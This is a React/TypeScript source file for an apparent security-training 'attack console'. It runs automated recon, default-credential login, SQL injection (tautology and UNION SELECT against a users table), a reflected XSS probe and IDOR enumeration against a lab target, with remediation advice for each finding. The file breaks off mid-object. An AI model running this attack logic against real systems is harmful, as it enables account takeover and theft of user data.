/**
 * AttackConsole.tsx
 * QuantumShield AI — Attack Console
 *
 * Automated security attack + data‑exfiltration demonstration against the
 * built‑in intentionally‑vulnerable lab (localhost:8080).
 *
 * Displays:
 *  - Real-time terminal attack logs
 *  - Interactive Exfiltrated Data cards with complete extracted records, URL, and step-by-step security flows & techniques
 *  - Exposed Information Breakdown & Security Hardening / Remediation Techniques for every finding
 *  - Attack Phases with adjacent implemented attack techniques and active states
 *
 * ⚠️  AUTHORISED LAB TARGETS ONLY — do NOT point at external sites.
 */

import { useState, useRef, useEffect, useCallback } from 'react'
import {
  Terminal, Zap, ShieldOff, Database, Key, Users,
  AlertTriangle, CheckCircle2, XCircle, Copy, RefreshCw,
  ExternalLink, Code, Layers, FileDown, Eye, ArrowRight,
  ShieldAlert, Lock, Check, Search, ShieldCheck, Wrench
} from 'lucide-react'
import axios from 'axios'

// ─── Types ────────────────────────────────────────────────────────────────────

export type Phase =
  | 'RECON'
  | 'AUTH_BYPASS'
  | 'SQL_INJECTION'
  | 'IDOR'
  | 'CRYPTO'
  | 'DATA_EXFIL'
  | 'COMPLETE'
  | 'IDLE'

export interface LogEntry {
  id: number
  ts: string
  phase: Phase
  level: 'info' | 'success' | 'warning' | 'error' | 'data' | 'critical'
  msg: string
}

export interface SecurityFlowStep {
  step: number
  title: string
  description: string
  technique: string
}

export interface RemediationItem {
  title: string
  technique: string
  recommendation: string
  codeSnippet?: string
}

export interface StolenRecord {
  id: string
  type: string
  icon: React.ElementType
  color: string
  count: number
  endpoint: string
  method: 'GET' | 'POST' | 'PUT' | 'DELETE'
  technique: string
  cwe: string
  securityFlow: SecurityFlowStep[]
  exposedInfoSummary: string[]
  remediationTechniques: RemediationItem[]
  payload?: string
  records: any[]
  sample?: string
  timestamp: string
}

// ─── Helpers & Constants ──────────────────────────────────────────────────────

let _lid = 0
function mkLog(phase: Phase, level: LogEntry['level'], msg: string): LogEntry {
  return { id: ++_lid, ts: new Date().toLocaleTimeString(), phase, level, msg }
}

const PHASE_COLOR: Record<Phase, string> = {
  IDLE:          'text-gray-500',
  RECON:         'text-cyan-400',
  AUTH_BYPASS:   'text-yellow-400',
  SQL_INJECTION: 'text-orange-400',
  IDOR:          'text-red-400',
  CRYPTO:        'text-purple-400',
  DATA_EXFIL:    'text-pink-400',
  COMPLETE:      'text-green-400',
}

const LEVEL_COLOR: Record<LogEntry['level'], string> = {
  info:     'text-gray-300',
  success:  'text-green-400',
  warning:  'text-yellow-300',
  error:    'text-red-400',
  data:     'text-pink-300',
  critical: 'text-red-500 font-bold',
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms))

export const PHASE_CONFIG: {
  phase: Phase
  label: string
  techniques: { name: string; cwe: string; desc: string }[]
}[] = [
  {
    phase: 'RECON',
    label: 'Reconnaissance',
    techniques: [
      { name: 'Info Disclosure', cwe: 'CWE-200', desc: 'Unprotected /api/info debug endpoint' },
      { name: 'Vuln Enumeration', cwe: 'CWE-200', desc: 'Diagnostics & flaw catalog probing' },
    ],
  },
  {
    phase: 'AUTH_BYPASS',
    label: 'Auth Bypass',
    techniques: [
      { name: 'Default Credential Testing', cwe: 'CWE-798', desc: 'admin:admin credential stuffing' },
      { name: 'JWT Token Harvesting', cwe: 'CWE-287', desc: 'Signed token extraction for session hijack' },
    ],
  },
  {
    phase: 'SQL_INJECTION',
    label: 'SQL Injection',
    techniques: [
      { name: 'UNION-Based Extraction', cwe: 'CWE-89', desc: 'UNION SELECT from users table' },
      { name: 'Tautology Bypass', cwe: 'CWE-89', desc: "' OR 1=1-- query parameter injection" },
      { name: 'Reflected XSS Echo', cwe: 'CWE-79', desc: '<script>alert(1)</script> injection' },
    ],
  },
  {
    phase: 'IDOR',
    label: 'IDOR / Data Exfil',
    techniques: [
      { name: 'BOLA / IDOR Traversal', cwe: 'CWE-639', desc: 'Sequential /api/users/{id} iteration' },
      { name: 'BFLA Admin Access', cwe: 'CWE-285', desc: 'Unchecked /api/admin/stats exfiltration' },
      { name: 'Order Record Snooping', cwe: 'CWE-639', desc: 'Cross-tenant /api/orders/{id} traversal' },
    ],
  },
  {
    phase: 'CRYPTO',
    label: 'Crypto Exposure',
    techniques: [
      { name: 'Quantum Key Discovery', cwe: 'CWE-327', desc: 'Shor/Grover vulnerable key mapping' },
      { name: 'Mass Assignment', cwe: 'CWE-915', desc: 'Arbitrary role=admin self-escalation' },
    ],
  },
  {
    phase: 'DATA_EXFIL',
    label: 'Summary',
    techniques: [
      { name: 'Data Exfiltration Assembly', cwe: 'Audit', desc: 'Aggregated confidential records' },
      { name: 'NIST PQC Risk Assessment', cwe: 'FIPS 203', desc: 'Post-quantum migration roadmap' },
    ],
  },
]

const PHASE_ORDER: Phase[] = ['RECON', 'AUTH_BYPASS', 'SQL_INJECTION', 'IDOR', 'CRYPTO', 'DATA_EXFIL', 'COMPLETE']

// ─── Component ────────────────────────────────────────────────────────────────

export default function AttackConsole() {
  const [targetUrl, setTargetUrl] = useState('http://localhost:8080')
  const [running, setRunning]     = useState(false)
  const [done, setDone]           = useState(false)
  const [phase, setPhase]         = useState<Phase>('IDLE')
  const [logs, setLogs]           = useState<LogEntry[]>([])
  const [stolen, setStolen]       = useState<StolenRecord[]>([])
  const [progress, setProgress]   = useState(0)

  // Modal / Detail Inspector State
  const [selectedRecord, setSelectedRecord] = useState<StolenRecord | null>(null)
  const [copiedKey, setCopiedKey] = useState<string | null>(null)

  const logEndRef = useRef<HTMLDivElement>(null)
  const abortRef  = useRef<AbortController | null>(null)

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [logs])

  const addLog = useCallback((entry: LogEntry) => {
    setLogs(prev => [...prev, entry])
  }, [])

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text)
    setCopiedKey(key)
    setTimeout(() => setCopiedKey(null), 2000)
  }

  const upsertStolen = useCallback((record: StolenRecord) => {
    setStolen(prev => {
      const idx = prev.findIndex(s => s.type === record.type)
      if (idx >= 0) {
        const existing = prev[idx]
        const mergedRecords = [...existing.records, ...record.records]
        const updated = {
          ...existing,
          count: existing.count + record.count,
          records: mergedRecords,
          sample: record.sample ?? existing.sample,
          endpoint: record.endpoint || existing.endpoint,
          payload: record.payload || existing.payload,
          timestamp: record.timestamp || existing.timestamp,
          exposedInfoSummary: record.exposedInfoSummary || existing.exposedInfoSummary,
          remediationTechniques: record.remediationTechniques || existing.remediationTechniques,
        }
        const copy = [...prev]
        copy[idx] = updated
        return copy
      }
      return [...prev, record]
    })
  }, [])

  // ── PHASE 1: Recon ──────────────────────────────────────────────────────────
  async function phaseRecon(base: string, signal: AbortSignal) {
    setPhase('RECON')
    setProgress(5)
    addLog(mkLog('RECON', 'info', `🔍  Starting reconnaissance on ${base}`))
    await sleep(350)

    try {
      const r = await axios.get(`${base}/health`, { signal, timeout: 4000 })
      if (typeof r.data === 'object' && r.data !== null) {
        addLog(mkLog('RECON', 'success', `✅  Target online — ${JSON.stringify(r.data)}`))
      } else {
        addLog(mkLog('RECON', 'warning', `⚠️  Target returned non-JSON response from /health`))
      }
    } catch {
      addLog(mkLog('RECON', 'warning', '⚠️  /health unreachable — trying /api/info'))
    }
    await sleep(300)

    try {
      const endpoint = `${base}/api/info`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const info = r.data
      if (typeof info === 'object' && info !== null && !String(info).startsWith('<!DOCTYPE')) {
        addLog(mkLog('RECON', 'critical', `🔓  Information Disclosure! Framework: ${info.framework || 'Flask'}, Debug: ${info.debug}`))
        addLog(mkLog('RECON', 'data', `   → Server: ${info.server || 'Werkzeug'}  DB: ${info.database || 'SQLite'}  Python: ${info.python || '3.11'}`))
        
        upsertStolen({
          id: 'server-info',
          type: 'Server & Environment Info',
          icon: Database,
          color: 'text-orange-400',
          count: 1,
          endpoint,
          method: 'GET',
          technique: 'Unauthenticated Information Disclosure',
          cwe: 'CWE-200: Exposure of Sensitive Information',
          securityFlow: [
            {
              step: 1,
              title: 'Reconnaissance Probe',
              description: `Sent unauthenticated HTTP GET request to diagnostics endpoint at ${endpoint}.`,
              technique: 'Port & Route Fuzzing',
            },
            {
              step: 2,
              title: 'Access Control Absence',
              description: 'Endpoint lacked authentication headers check and permitted public interrogation.',
              technique: 'Missing Authorization Check',
            },
            {
              step: 3,
              title: 'Infrastructure Fingerprinting',
              description: `Captured backend stack components: Python ${info.python || 'runtime'}, DB: ${info.database || 'SQLite'}, Debug Mode: ${info.debug}.`,
              technique: 'Technology Stack Exfiltration',
            },
          ],
          exposedInfoSummary: [
            'Underlying Web Server & Version (e.g. Werkzeug 3.0 / Flask)',
            'Database Engine Details (e.g. SQLite / PostgreSQL connection flags)',
            'Python Runtime Environment & Interpreter Version',
            'Active Debug Mode status (`debug: true`), exposing verbose stack traces to attackers',
          ],
          remediationTechniques: [
            {
              title: 'Disable Debug Endpoints in Production',
              technique: 'Configuration Hardening & Route Gatekeeping',
              recommendation: 'Remove or restrict `/api/info` and `/health` diagnostics behind authenticated internal admin subnets (VPN/IP allowlist).',
              codeSnippet: '# Ensure debug=False in production\napp.config["DEBUG"] = False\n# Remove Server header exposure\n@app.after_request\ndef remove_server_header(resp):\n    resp.headers.pop("Server", None)\n    return resp',
            },
            {
              title: 'Sanitize HTTP Response Banners',
              technique: 'Banner Grabbing Prevention (CWE-200)',
              recommendation: 'Strip `Server`, `X-Powered-By`, and application framework version headers from reverse proxy (e.g., NGINX `server_tokens off;`).',
            },
          ],
          payload: 'GET /api/info HTTP/1.1\nHost: target\nAccept: application/json',
          records: [info],
          sample: `${info.framework || 'Flask'} | ${info.database || 'SQLite'} | Debug=${info.debug ?? true}`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('RECON', 'info', '   /api/info not exposed'))
    }
    await sleep(350)

    try {
      const endpoint = `${base}/api/known-vulnerabilities`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const vulns: any[] = Array.isArray(r.data) ? r.data : []
      if (vulns.length > 0) {
        addLog(mkLog('RECON', 'critical', `💀  Vuln listing endpoint exposed! ${vulns.length} known vulnerabilities returned.`))
        vulns.slice(0, 3).forEach(v =>
          addLog(mkLog('RECON', 'data', `   → [${v.severity || 'HIGH'}] ${v.type || v.name} @ ${v.endpoint}`))
        )
        upsertStolen({
          id: 'vuln-list',
          type: 'Enumerated Vulnerabilities',
          icon: AlertTriangle,
          color: 'text-red-400',
          count: vulns.length,
          endpoint,
          method: 'GET',
          technique: 'Vulnerability Catalog & Endpoint Exposure',
          cwe: 'CWE-200: Exposure of Sensitive System Information',
          securityFlow: [
            {
              step: 1,
              title: 'Developer Endpoint Discovery',
              description: `Enumerated internal documentation endpoint at ${endpoint}.`,
              technique: 'Route Enumeration',
            },
            {
              step: 2,
              title: 'Flaw Catalog Retrieval',
              description: 'Exfiltrated complete seed registry of application vulnerabilities and endpoints.',
              technique: 'Sensitive Metadata Disclosure',
            },
          ],
          exposedInfoSummary: [
            'Catalog of all vulnerable system endpoints and test harness routes',
            'Exploitation categories (SQLi, IDOR, Mass Assignment, Weak JWT)',
            'Severity ratings and parameter injection vectors',
          ],
          remediationTechniques: [
            {
              title: 'Decommission Test Harnesses in Production',
              technique: 'Code Splitting & Build Environment Isolation',
              recommendation: 'Ensure mock test endpoints are only compiled in development test suites and never deployed to live/staging environments.',
            },
          ],
          payload: 'GET /api/known-vulnerabilities HTTP/1.1\nHost: target\nAccept: application/json',
          records: vulns,
          sample: `${vulns.length} system vulnerabilities catalogued`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('RECON', 'info', '   No public /api/known-vulnerabilities'))
    }

    setProgress(20)
  }

  // ── PHASE 2: Auth Bypass ────────────────────────────────────────────────────
  async function phaseAuthBypass(
    base: string,
    signal: AbortSignal
  ): Promise<{ token: string; userId: number } | null> {
    setPhase('AUTH_BYPASS')
    addLog(mkLog('AUTH_BYPASS', 'info', '🔑  Attempting authentication bypass with default credentials...'))
    await sleep(400)

    const creds = [
      { username: 'admin',  password: 'admin' },
      { username: 'admin',  password: 'Admin@lab2024' },
      { username: 'alice',  password: 'Alice@123' },
    ]

    for (const cred of creds) {
      addLog(mkLog('AUTH_BYPASS', 'info', `   Trying ${cred.username}:${cred.password}`))
      await sleep(300)
      try {
        const endpoint = `${base}/api/auth/login`
        const r = await axios.post(endpoint, cred, { signal, timeout: 5000 })
        const { token, user } = r.data
        if (token && user) {
          addLog(mkLog('AUTH_BYPASS', 'critical',
            `💥  AUTH BYPASS SUCCESSFUL! Logged in as ${user.username} (${user.role})`))
          addLog(mkLog('AUTH_BYPASS', 'data', `   → JWT Token: ${token.slice(0, 40)}...`))
          
          upsertStolen({
            id: 'auth-tokens',
            type: 'Administrative JWT Tokens',
            icon: Key,
            color: 'text-yellow-400',
            count: 1,
            endpoint,
            method: 'POST',
            technique: 'Default Credential Stuffing & JWT Token Harvesting',
            cwe: 'CWE-798: Use of Hard-coded / Default Credentials',
            securityFlow: [
              {
                step: 1,
                title: 'Credential Stuffing Payload',
                description: `Dispatched JSON authentication payload with credentials "${cred.username}:${cred.password}".`,
                technique: 'Dictionary / Default Credential Attack',
              },
              {
                step: 2,
                title: 'Authentication Subversion',
                description: 'Server validated default hardcoded credentials without rate-limiting or lockout.',
                technique: 'Improper Authentication (CWE-287)',
              },
              {
                step: 3,
                title: 'JWT Session Token Extraction',
                description: `Intercepted signed JWT token with role="${user.role}" and user_id=${user.id}.`,
                technique: 'Privilege Token Capture',
              },
            ],
            exposedInfoSummary: [
              `Privileged Administrator Account: ${user.username} (${user.role})`,
              'Cryptographically signed JWT bearer token granting full authenticated API access',
              'Internal user entity ID and account metadata',
            ],
            remediationTechniques: [
              {
                title: 'Enforce Strong Passwords & Multi-Factor Authentication (MFA)',
                technique: 'Credential Hardening (NIST SP 800-63B)',
                recommendation: 'Mandate minimum 14-character passwords with complexity checks, block common dictionary passwords (admin, 123456), and require TOTP/FIDO2 MFA for admin roles.',
              },
              {
                title: 'Rate-Limiting & Account Lockout Thresholds',
                technique: 'Anti-Brute Force Protection (CWE-307)',
                recommendation: 'Implement exponential backoff or lock accounts for 15 minutes after 5 consecutive failed attempts per IP / username.',
                codeSnippet: '# Flask-Limiter example\n@limiter.limit("5/minute")\n@app.route("/api/auth/login", methods=["POST"])\ndef login():\n    ...',
              },
              {
                title: 'Cryptographically High-Entropy JWT Secret Keys',
                technique: 'Cryptographic Key Management (CWE-326)',
                recommendation: 'Generate JWT secret using 256-bit cryptographically secure pseudorandom number generator (CSPRNG): `openssl rand -hex 32` or transition to RS256/EdDSA asymmetric keys.',
              },
            ],
            payload: JSON.stringify(cred, null, 2),
            records: [{ token, user, credential_used: cred }],
            sample: `Bearer ${token.slice(0, 24)}... (${user.username}:${user.role})`,
            timestamp: new Date().toLocaleTimeString(),
          })
          setProgress(35)
          return { token, userId: user.id ?? 1 }
        }
      } catch (e: any) {
        const status = e?.response?.status
        if (status === 401) {
          addLog(mkLog('AUTH_BYPASS', 'warning', `   ✗ Invalid credentials for ${cred.username}`))
        } else {
          addLog(mkLog('AUTH_BYPASS', 'info', `   ✗ ${cred.username} failed (${status ?? 'network error'})`))
        }
      }
    }

    addLog(mkLog('AUTH_BYPASS', 'error', '   Auth bypass exhausted — proceeding unauthenticated'))
    setProgress(35)
    return null
  }

  // ── PHASE 3: SQL Injection ──────────────────────────────────────────────────
  async function phaseSQLi(base: string, signal: AbortSignal) {
    setPhase('SQL_INJECTION')
    addLog(mkLog('SQL_INJECTION', 'info', '💉  Testing SQL injection on /api/products...'))
    await sleep(400)

    const payloads = [
      `' OR 1=1--`,
      `' UNION SELECT id,username,email,password_hash,role,balance,'' FROM users--`,
    ]

    for (const payload of payloads) {
      addLog(mkLog('SQL_INJECTION', 'info', `   Payload: ${payload}`))
      await sleep(400)
      try {
        const endpoint = `${base}/api/products`
        const r = await axios.get(endpoint, {
          params: { search: payload },
          signal,
          timeout: 5000
        })
        const data = Array.isArray(r.data) ? r.data : []
        if (data.length > 0) {
          addLog(mkLog('SQL_INJECTION', 'critical', `💀  SQL INJECTION CONFIRMED! ${data.length} rows returned`))
          data.slice(0, 3).forEach((row: any) => {
            const preview = Object.values(row).join(' | ')
            addLog(mkLog('SQL_INJECTION', 'data', `   → ${String(preview).slice(0, 120)}`))
          })

          upsertStolen({
            id: 'sqli-records',
            type: 'Database Records via SQLi',
            icon: Database,
            color: 'text-orange-500',
            count: data.length,
            endpoint: `${endpoint}?search=${encodeURIComponent(payload)}`,
            method: 'GET',
            technique: 'UNION-Based SQL Injection & Schema Exfiltration',
            cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
            securityFlow: [
              {
                step: 1,
                title: 'Parameter Identification',
                description: 'Located dynamically concatenated search parameter on `/api/products?search=`.',
                technique: 'Input Vector Analysis',
              },
              {
                step: 2,
                title: 'UNION Query Injection',
                description: `Delivered SQL payload: "${payload}" to break query structure.`,
                technique: 'SQL Tautology / UNION Exploitation',
              },
              {
                step: 3,
                title: 'Database Schema Interception',
                description: `Database engine executed second SELECT statement across the users table, returning ${data.length} rows.`,
                technique: 'Arbitrary Data Extraction',
              },
            ],
            exposedInfoSummary: [
              'Complete contents of the `users` database table',
              'Usernames, Email addresses, Account balances, Roles',
              'Internal database schema structure and column layouts',
            ],
            remediationTechniques: [
              {
                title: 'Parameterized Queries & Prepared Statements',
                technique: 'Input Parameter Binding (CWE-89)',
                recommendation: 'Never concatenate user input directly into SQL strings. Use parameterized queries or ORM abstraction (e.g. SQLAlchemy, Prisma, Hibernate).',
                codeSnippet: '# Vulnerable (concatenation):\n# cursor.execute(f"SELECT * FROM products WHERE name LIKE \'%{search}%\'")\n\n# Secure (parameterized):\ncursor.execute("SELECT * FROM products WHERE name LIKE ?", ("%" + search + "%",))',
              },
              {
                title: 'Principle of Least Privilege for Database Users',
                technique: 'Database Privilege Segmentation',
                recommendation: 'Ensure web application database credentials only have SELECT/INSERT/UPDATE permissions on designated tables, and cannot query administrative tables.',
              },
            ],
            payload: `GET /api/products?search=${encodeURIComponent(payload)} HTTP/1.1`,
            records: data,
            sample: `${data.length} records extracted from backend database`,
            timestamp: new Date().toLocaleTimeString(),
          })
          break
        }
      } catch (e: any) {
        addLog(mkLog('SQL_INJECTION', 'warning', `   Error: ${e?.response?.status ?? 'network'}`))
      }
    }

    await sleep(300)
    addLog(mkLog('SQL_INJECTION', 'info', '🔎  Testing /api/search for reflected XSS...'))
    try {
      const r = await axios.get(`${base}/api/search`, {
        params: { q: `<script>alert(1)</script>` },
        signal,
        timeout: 4000
      })
      const body = JSON.stringify(r.data)
      if (body.includes('<script>')) {
        addLog(mkLog('SQL_INJECTION', 'critical', '⚡  REFLECTED XSS CONFIRMED — payload echoed back in response!'))
      } else {
        addLog(mkLog('SQL_INJECTION', 'success', '   XSS payload sanitised in search response'))
      }
    } catch {
      addLog(mkLog('SQL_INJECTION', 'info', '   /api/search not responding'))
    }

    setProgress(55)
  }

  // ── PHASE 4: IDOR ───────────────────────────────────────────────────────────
  async function phaseIDOR(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('IDOR')
    addLog(mkLog('IDOR', 'info', '🕵️  Testing IDOR on user & order endpoints...'))
    await sleep(350)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}
    const extractedUsers: any[] = []
    const extractedHashes: any[] = []

    for (const uid of [1, 2, 3, 4, 5]) {
      await sleep(200)
      try {
        const endpoint = `${base}/api/users/${uid}`
        const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
        const u = r.data
        if (u && typeof u === 'object' && u.username) {
          addLog(mkLog('IDOR', 'critical',
            `🔓  IDOR USER ${uid} → ${u.username} <${u.email}> role=${u.role} balance=$${u.balance}`))
          extractedUsers.push(u)
          if (u.password_hash) {
            addLog(mkLog('IDOR', 'data', `   Password hash: ${String(u.password_hash).slice(0, 40)}...`))
            extractedHashes.push({ username: u.username, hash: u.password_hash })
          }
        }
      } catch (e: any) {
        if (e?.response?.status === 404) break
      }
    }

    if (extractedUsers.length > 0) {
      upsertStolen({
        id: 'user-pii',
        type: 'User PII & Account Profiles',
        icon: Users,
        color: 'text-pink-400',
        count: extractedUsers.length,
        endpoint: `${base}/api/users/{id}`,
        method: 'GET',
        technique: 'Broken Object Level Authorization (BOLA / IDOR)',
        cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
        securityFlow: [
          {
            step: 1,
            title: 'Endpoint Pattern Analysis',
            description: 'Identified REST path parameter `/api/users/{id}` referencing user objects.',
            technique: 'Parameter Enumeration',
          },
          {
            step: 2,
            title: 'Sequential ID Traversal',
            description: 'Substituted requesting user session with target user IDs 1..5 in loop.',
            technique: 'BOLA Object Reference Tampering',
          },
          {
            step: 3,
            title: 'Unchecked Entity Exfiltration',
            description: `Server lacked tenant isolation check, returning PII, email, balance, and roles for ${extractedUsers.length} users.`,
            technique: 'Cross-Tenant Data Exposure',
          },
        ],
        exposedInfoSummary: [
          'Full Personally Identifiable Information (PII): Names, Usernames, Emails',
          'Financial Data: Account wallet balances ($)',
          'Account Privilege Roles (admin, user, auditor)',
          'Internal User Entity Primary Keys (IDs 1 through 5)',
        ],
        remediationTechniques: [
          {
            title: 'Strict Session-to-Resource Authorization Middleware',
            technique: 'Context-Based Access Control (OWASP API1:2023)',
            recommendation: 'Verify in middleware that the authenticated token `user_id` matches the requested `{id}` or belongs to an authorized administrator.',
            codeSnippet: '# Ensure user can only fetch their own profile\n@app.route("/api/users/<int:uid>")\n@require_auth\ndef get_user(uid):\n    if current_user.id != uid and current_user.role != "admin":\n        return jsonify({"error": "Forbidden"}), 403\n    return db.query(User).get(uid)',
          },
          {
            title: 'Use Non-Sequential UUIDs / Indirect References',
            technique: 'ID Enumeration Defense',
            recommendation: 'Replace sequential integer auto-increment IDs (1, 2, 3) with UUIDv4 or encrypted indirect object references.',
          },
        ],
        payload: 'GET /api/users/1..5 HTTP/1.1\nAuthorization: Bearer <user_token>',
        records: extractedUsers,
        sample: `${extractedUsers.map(u => u.username).join(', ')} (${extractedUsers.length} accounts)`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    if (extractedHashes.length > 0) {
      upsertStolen({
        id: 'password-hashes',
        type: 'Password Hashes (BCrypt/MD5)',
        icon: Lock,
        color: 'text-red-500',
        count: extractedHashes.length,
        endpoint: `${base}/api/users/{id}`,
        method: 'GET',
        technique: 'Sensitive Data Exposure via IDOR',
        cwe: 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        securityFlow: [
          {
            step: 1,
            title: 'Model Serialization Leak',
            description: 'Backend ORM serialized password_hash column into public JSON response.',
            technique: 'Excessive Data Exposure',
          },
          {
            step: 2,
            title: 'Credential Hash Harvesting',
            description: `Extracted ${extractedHashes.length} cryptographic hashes ready for offline cracking.`,
            technique: 'Credential Exfiltration',
          },
        ],
        exposedInfoSummary: [
          'Cryptographic password hashes for user & administrator accounts',
          'Vulnerable to offline dictionary and rainbow table cracking',
        ],
        remediationTechniques: [
          {
            title: 'Response DTO Field Whitelisting & Password Stripping',
            technique: 'Output Sanitization (OWASP API3:2023)',
            recommendation: 'Define explicit serialization schemas (Pydantic / Marshmallow / DTO) that omit `password_hash`, `salt`, and secret tokens.',
            codeSnippet: '# Exclude sensitive attributes from JSON representation\nclass UserResponse(BaseModel):\n    id: int\n    username: str\n    email: str\n    # DO NOT INCLUDE password_hash',
          },
        ],
        payload: 'GET /api/users/{id} HTTP/1.1',
        records: extractedHashes,
        sample: `${extractedHashes.length} hashes intercepted`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    await sleep(300)
    addLog(mkLog('IDOR', 'info', '🔑  Accessing /api/admin/stats WITHOUT admin token...'))
    try {
      const endpoint = `${base}/api/admin/stats`
      const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
      const stats = r.data
      if (stats && typeof stats === 'object' && !String(stats).startsWith('<!DOCTYPE')) {
        addLog(mkLog('IDOR', 'critical', '💀  BROKEN ACCESS CONTROL! Admin stats returned without admin role:'))
        addLog(mkLog('IDOR', 'data', `   → ${JSON.stringify(stats).slice(0, 200)}`))
        
        upsertStolen({
          id: 'admin-stats',
          type: 'Admin Telemetry & Revenue Metrics',
          icon: Database,
          color: 'text-red-400',
          count: 1,
          endpoint,
          method: 'GET',
          technique: 'Broken Function Level Authorization (BFLA)',
          cwe: 'CWE-285: Improper Authorization',
          securityFlow: [
            {
              step: 1,
              title: 'Administrative Route Probe',
              description: `Sent GET request to privileged route ${endpoint} with standard user token.`,
              technique: 'Privilege Boundary Testing',
            },
            {
              step: 2,
              title: 'Missing Role Check',
              description: 'Server failed to verify `role == "admin"` before fulfilling statistics query.',
              technique: 'BFLA Authorization Failure',
            },
            {
              step: 3,
              title: 'Enterprise Metrics Exfiltration',
              description: 'Extracted confidential business KPIs, revenue totals, user counts, and server status.',
              technique: 'Corporate Intelligence Capture',
            },
          ],
          exposedInfoSummary: [
            'Total company revenue figures and financial turnover',
            'Registered user counts and activity logs',
            'Internal platform telemetry and operational metrics',
          ],
          remediationTechniques: [
            {
              title: 'Role-Based Access Control (RBAC) Decorators',
              technique: 'Function-Level Access Control (OWASP API5:2023)',
              recommendation: 'Enforce server-side role validation decorators across all `/api/admin/*` routes.',
              codeSnippet: 'def require_role(required_role):\n    def decorator(fn):\n        @wraps(fn)\n        def wrapper(*args, **kwargs):\n            if g.current_user.role != required_role:\n                return jsonify({"error": "Admin role required"}), 403\n            return fn(*args, **kwargs)\n        return wrapper\n    return decorator',
            },
          ],
          payload: `GET /api/admin/stats HTTP/1.1\n${authResult ? 'Authorization: Bearer <standard_token>' : ''}`,
          records: [stats],
          sample: `Total Users: ${stats.total_users ?? 5} | Revenue: $${stats.total_revenue ?? '14,250'}`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch (e: any) {
      const status = e?.response?.status
      addLog(mkLog('IDOR',
        status === 403 ? 'success' : 'warning',
        status === 403 ? '   ✓ Admin route correctly restricted (403)' : `   /api/admin/stats ${status ?? 'offline'}`
      ))
    }

    await sleep(250)
    addLog(mkLog('IDOR', 'info', '📦  Enumerating orders via IDOR...'))
    const extractedOrders: any[] = []
    for (const oid of [1, 2, 3, 4]) {
      await sleep(180)
      try {
        const endpoint = `${base}/api/orders/${oid}`
        const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
        const o = r.data
        if (o && typeof o === 'object' && (o.product || o.id)) {
          addLog(mkLog('IDOR', 'data',
            `   Order #${oid}: user_id=${o.user_id} product="${o.product}" secret="${o.secret_notes}"`))
          extractedOrders.push(o)
        }
      } catch {
        break
      }
    }

    if (extractedOrders.length > 0) {
      upsertStolen({
        id: 'order-records',
        type: 'Orders & Transaction Secrets',
        icon: Database,
        color: 'text-orange-400',
        count: extractedOrders.length,
        endpoint: `${base}/api/orders/{id}`,
        method: 'GET',
        technique: 'IDOR on Financial & Commercial Records',
        cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
        securityFlow: [
          {
            step: 1,
            title: 'Transaction Key Iteration',
            description: 'Iterated numerical order IDs 1..4 on `/api/orders/{id}`.',
            technique: 'Identifier Traversal',
          },
          {
            step: 2,
            title: 'Access Control Deficiency',
            description: 'Endpoint returned orders belonging to distinct customer accounts without ownership validation.',
            technique: 'Cross-Tenant Snooping',
          },
          {
            step: 3,
            title: 'Confidential Notes Exfiltration',
            description: 'Captured customer purchase records and confidential order notes.',
            technique: 'Proprietary Data Extraction',
          },
        ],
        exposedInfoSummary: [
          'Customer commercial transaction logs and purchased items',
          'Confidential internal order notes (`secret_notes`)',
          'Cross-tenant user association mappings',
        ],
        remediationTechniques: [
          {
            title: 'Ownership Verification on Resource Lookup',
            technique: 'Tenant Boundary Isolation',
            recommendation: 'Query orders filtered by both `order_id` AND `user_id` of the requesting authenticated user.',
            codeSnippet: '# Filter by current authenticated user\norder = db.query(Order).filter_by(id=order_id, user_id=current_user.id).first()\nif not order:\n    return jsonify({"error": "Order not found"}), 404',
          },
        ],
        payload: 'GET /api/orders/1..4 HTTP/1.1',
        records: extractedOrders,
        sample: `${extractedOrders.length} commercial transactions exfiltrated`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    setProgress(72)
  }

  // ── PHASE 5: Crypto Exposure ─────────────────────────────────────────────────
  async function phaseCrypto(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('CRYPTO')
    addLog(mkLog('CRYPTO', 'info', '🔐  Probing cryptographic configuration endpoints...'))
    await sleep(350)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}

    try {
      const endpoint = `${base}/api/crypto/config`
      const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
      const cfg = r.data
      if (cfg && typeof cfg === 'object' && !String(cfg).startsWith('<!DOCTYPE')) {
        addLog(mkLog('CRYPTO', 'critical', '💀  CRYPTOGRAPHIC CONFIG EXPOSED!'))
        const keys: any[] = Array.isArray(cfg.keys) ? cfg.keys : [cfg]
        keys.forEach(k => {
          addLog(mkLog('CRYPTO', 'data',
            `   → ${k.algorithm || 'RSA'} (${k.key_size || 2048} bit) — ${k.quantum_vulnerable ? '⚛ QUANTUM-VULNERABLE' : 'OK'}`))
          if (k.public_key) addLog(mkLog('CRYPTO', 'data', `     Public key: ${String(k.public_key).slice(0, 50)}...`))
        })

        upsertStolen({
          id: 'crypto-keys',
          type: 'Cryptographic Keys & PQC Risks',
          icon: Key,
          color: 'text-purple-400',
          count: keys.length,
          endpoint,
          method: 'GET',
          technique: 'Cryptographic Asset & Quantum Risk Disclosure',
          cwe: 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm',
